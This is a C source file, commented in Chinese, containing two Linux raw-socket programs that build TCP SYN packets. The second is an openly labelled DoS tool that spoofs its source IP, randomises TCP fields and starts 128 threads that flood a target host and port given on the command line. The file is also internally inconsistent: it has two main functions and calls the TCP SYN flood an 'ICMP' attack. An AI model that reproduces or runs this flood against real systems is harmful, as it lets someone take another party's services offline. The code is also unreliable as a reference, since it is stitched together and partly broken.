#if defined(__linux)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in dest_addr;
    char packet[4096];
    struct iphdr *ip_header = (struct iphdr *)packet;
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int i;

    // 创建套接字
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // 设置目标地址
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(80);
    dest_addr.sin_addr.s_addr = inet_addr("192.168.1.1");

    // 构造IP头部
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip_header->id = htons(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr("192.168.1.2");
    ip_header->daddr = dest_addr.sin_addr.s_addr;

    // 构造TCP头部
    tcp_header->source = htons(1234);
    tcp_header->dest = dest_addr.sin_port;
    tcp_header->seq = htonl(1);
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->syn = 1;
    tcp_header->window = htons(5840);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    // 发送SYN数据包
    for (i = 0; i < 10; i++) {
        sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        sleep(1);
    }

    // 关闭套接字
    close(sockfd);

    return 0;
}
#endif

#if defined(__linux)
#include <snConf.h>
#include <snTime.h>

#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <pthread.h>

#define MAXCHILD 128
#define PROTO_NAME "tcp"
#define FAKE_IP "192.168.0.222"

static unsigned long dest = 0;
static unsigned short dest_port = 0;
static int PROTO_TCP = -1;
static int alive = -1;
int rawsock = 0;

typedef struct dosseg_t {
    struct ip iph;
    struct tcphdr tcph;
    unsigned char data[8192];
} DOSSEG_T;

//数据包校验
static unsigned short Dos_cksum(unsigned short *data, int length)
{
    register int left = length;
    register unsigned short *word = data;
    register int sum = 0;
    unsigned short ret = 0;

    while (left > 1) {
        sum += *word++;
        left -= 2;
    }

    if (left == 1) {
        *(unsigned char *)(&ret) = *(unsigned char *)word;
        sum += ret;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    ret = ~sum;
    return (ret);
}

/* 随机生成攻击请求源端口 */
static inline long myrandom(int begin, int end)
{
    int gap = end - begin + 1;
    int ret = 0;

    srand((unsigned)time(0));

    ret = random() % gap + begin;
    return ret;
}

static void Dos_sig()
{
    alive = 0;
    printf("stop DoS Attack!\n");
}

/* 构造tcp的请求syn包 */
void DoS_tcp_pack(char *packet)
{
    struct ip *ip_hdr = (struct ip *)packet;
    struct tcphdr *tcp_hdr = (struct tcphdr *)(packet + sizeof(struct ip));

    // ip头赋值
    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
    ip_hdr->ip_id = htons(getpid());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = PROTO_TCP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);  //伪装源地址
    ip_hdr->ip_dst.s_addr = dest;                //攻击的目的主机地址
    ip_hdr->ip_sum = Dos_cksum((unsigned short *)ip_hdr, (4 * ip_hdr->ip_hl + sizeof(struct tcphdr) + 1) & ~1);

    // tcp赋值
    tcp_hdr->seq = htonl((unsigned long)myrandom(0, 65535));
    tcp_hdr->ack_seq = htons(myrandom(0, 65535));
    tcp_hdr->syn = 1;
    tcp_hdr->urg = 1;
    tcp_hdr->window = htons(myrandom(0, 65535));
    tcp_hdr->check = 0;
    tcp_hdr->urg_ptr = htons(myrandom(0, 65535));
    tcp_hdr->check = Dos_cksum((unsigned short *)tcp_hdr, (sizeof(struct ip) + sizeof(struct tcphdr) + 1) & ~1);
}

void Dos_Attack()
{
    DOSSEG_T packet;
    struct sockaddr_in to;
    DoS_tcp_pack((char *)&packet);

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(0);

    while (alive)  //控制发包的全局变量
    {
        sendto(rawsock, &packet, 4 * packet.iph.ip_hl + sizeof(struct tcphdr), 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
    }
}

int main(int argc, char *argv[])
{
    struct hostent *host = NULL;
    struct protoent *protocol = NULL;
    int i = 0, err = -1;
    pthread_t attack_thread[MAXCHILD];

    /* 创建停止信号接收函数 */
    alive = 1;
    signal(SIGINT, Dos_sig);

    if (argc < 3) {
        printf("-------------Invalid input---------------!\n");
        return -1;
    }

    protocol = getprotobyname(PROTO_NAME);
    if (protocol == NULL) {
        printf("Fail to getprotobyname!\n");
        return -1;
    }

    PROTO_TCP = protocol->p_proto;

    //参数1：攻击目的IP   参数2：攻击的目的Port
    dest = inet_addr(argv[1]);
    dest_port = atoi(argv[2]);

    if (dest == INADDR_NONE) {
        host = gethostbyname(argv[1]);
        if (host == NULL) {
            printf("Invalid IP or Domain name!\n");
            return -1;
        }

        memcpy((char *)&dest, host->h_addr, host->h_length);
    }

    //创建原始套接字
    rawsock = socket(AF_INET, SOCK_RAW, PROTO_TCP);

    if (rawsock < 0) {
        printf("Fait to create socket!\n");
        return -1;
    }

    //设置IP选项
    setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof("1"));

    printf("ICMP FLOOD ATTACK START\n");

    for (i = 0; i < MAXCHILD; i++) {
        err = pthread_create(&(attack_thread[i]), NULL, (void *)Dos_Attack, NULL);
        if (err) {
            printf("Fail to create thread, err %d, thread id : %ld\n", err, attack_thread[i]);
        }
    }

    for (i = 0; i < MAXCHILD; i++) {
        pthread_join(attack_thread[i], NULL);
        //等待线程结束
    }

    printf("ICMP ATTACK FINISHI!\n");
    close(rawsock);

    return 0;
}

#endif // #if defined(__linux)